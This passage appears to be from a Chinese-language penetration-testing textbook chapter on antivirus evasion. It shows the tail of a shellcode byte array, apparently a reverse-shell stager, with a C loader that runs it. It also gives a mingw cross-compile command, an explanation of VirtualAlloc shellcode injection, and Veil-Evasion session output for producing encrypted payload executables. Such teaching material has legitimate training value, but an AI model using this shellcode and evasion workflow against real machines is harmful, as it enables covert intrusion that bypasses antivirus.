  x68\\x33\\x32\\x00\\x00\\x68\"\n\"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\\
  x07\\xff\\xd5\\xb8\\x90\\x01\"\n\"\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\\
  x6b\\x00\\xff\\xd5\\x50\\x50\"\n\"\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\\
  xdf\\xe0\\xff\\xd5\\x97\\x6a\"\n\"\\x05\\x68\\x0a\\x00\\x01\\x09\\x68\\x02\\x00\\\
  x09\\x29\\x89\\xe6\\x6a\\x10\"\n\"\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\\xff\\xd5\\\
  x85\\xc0\\x74\\x0c\\xff\\x4e\"\n\"\\x08\\x75\\xec\\x68\\xf0\\xb5\\xa2\\x56\\xff\\\
  xd5\\x6a\\x00\"\n\"\\x00\\x6a\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x8b\\x36\\\
  x6a\\x68\\x00\"\n\"\\x10\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\\
  xd5\\x93\\x53\\x6a\"\n\"\\x00\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x01\\\
  xc3\\x29\\xc6\"\n\"\\x85\\xf6\\x75\\ec\\xc3\";\n\nint main(void)\n{\n        ((void\
  \ (*)())shellcode)();\n}\n```\n\n现在我们需要编译这个 C 程序。我们不能使用内置的 `GCC`，因为会将会将程序编译为在 Linux\
  \ 上运行的版本，而我们希望它在 Windows 上运行。我们可以使用交叉编译工具 `i686-w64-mingw32-gcc` 来编译：\n\n```bash\n\
  i686-w64-mingw32-gcc custom_c.c -o custom_c.exe\n```\n\n编译完成后，你会得到一个 `custom_c.exe`\
  \ 文件。现在将其传输到目标 Windows 机器并运行。\n\n\n\n\n\n随着 Veil-Evasion 的更新，你的版本可能与此处显示的有所不同。\n\
  \n### 使用 Windows API 进行 Python Shellcode 注入\n\n之前我们查看了如何使用自定义 C 模板来编译和执行 shellcode。我们可以使用\
  \ Python 的 `Ctypes` 库来实现类似的操作，该库允许我们调用 Windows API 函数并创建与 C 兼容的数据类型。我们可以使用 `Ctypes`\
  \ 访问 Windows API `VirtualAlloc`，它会为 shellcode 创建一个新的可执行内存区域，并将该内存区域锁定在物理内存中，以避免在拷贝和执行\
  \ shellcode 时发生页错误。`RtlMoveMemory` 用于将 shellcode 字节复制到由 `VirtualAlloc` 创建的内存区域中。`CreateThread`\
  \ API 创建新线程来运行 shellcode，最后，`WaitForSingleObject` 等待创建的线程完成且我们的 shellcode 运行结束。\n\
  \n这些步骤合称为 `VirtualAlloc 注入方法`。当然，这种方法将带我们得到一个 Python 脚本而不是 Windows 可执行文件，但你可以使用多种工具将\
  \ Python 脚本转换为独立的可执行文件。\n\n### 使用 Veil-Evasion 创建 Python 生成的加密可执行文件\n\nVeil-Evasion\
  \ 实现的方法之一使用了之前描述的 Python 注入技术。为了提供进一步的防病毒保护，Veil-Evasion 可以使用加密。在示例中，我们将使用 Python\
  \ VirtualAlloc 注入结合 AES 加密，就像在本章之前的 Hyperion 示例中所做的那样。\n\n启动 Veil-Evasion，切换目录到\
  \ `Veil-Evasion-master` 并运行 `././Veil-Evasion.py`。你会看到一个基于菜单的提示，类似于我们在上一章在 SET 中看到的界面，如\
  \ 示例 12-9 所示。\n\n示例 12-9 运行 Veil\n\n```\nroot@kali:~/Veil-Evasion-master# ./Veil-Evasion.py\n\
  ========================================================================\n Veil-Evasion\
  \ | [Version]: 2.6.0\n========================================================================\n\
  \ [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework\n========================================================================\n\
  \n Main Menu\n\n    28 payloads loaded\n\n Available commands:\n\n    use      \
  \   use a specific payload\n    info        information on a specific payload\n\
  \    list        list available payloads\n    update      update Veil to the latest\
  \ version\n    clean       clean out payload folders\n    checkvt     check payload\
  \ hashes vs. VirusTotal\n    exit        exit Veil\n```\n\n要查看 Veil-Evasion 中所有可用的负载，在提示符输入\
  \ `list`，如 示例 12-10 所示。\n\n示例 12-10 Veil-Evasion payloads\n\n```\n[>] Please enter\
  \ a command: list\nAvailable payloads:\n    1)    auxiliary/coldwar_wrapper\n  \
  \  2)    auxiliary/pyinstaller_wrapper\n\n--snip--\n\n    22)    python/meterpreter/rev_tcp\n\
  \    23)    python/shellcode_inject/aes_encrypt\n    24)    python/shellcode_inject/arc_encrypt\n\
  \    25)    python/shellcode_inject/base64_substitution\n    26)    python/shellcode_inject/des_encrypt\n\
  \    27)    python/shellcode_inject/flat\n    28)    python/shellcode_inject/letter_substitution\n\
  ```\n\n截至本文编写时，Veil-Evasion 已实现了 28 种创建可执行文件的方法。在本示例中，选择选项 23 使用 VirtualAlloc 注入方法并使用\
  \ AES 加密对其进行加密。一旦选择了方法，Veil-Evasion 将提示你根据需要从默认值更改方法选项，如 示例 12-11 所示。\n\n示例 12-11\
  \ 在 Veil-Evasion 中使用 Python VirtualAlloc\n\n```\n[>] Please enter a command: 23\n\
  \nPayload: python/shellcode_inject/aes_encrypt loaded\n\n Required Options:\n\n\
  \ Name            Current Value    Description\n ----            ------------- \
  \   -----------\ncompile_to_exe  Y                Compile to an executable\n expire_paylo\
  \    X                Optional: Payloads expire after \"X\" days\ninject_method\
  \   Virtual          Virtual, Void, Heap\n use_pyherion    N                Use\
  \ the pyherion encrypter\n\n Available commands:\n\n    set             set a specific\
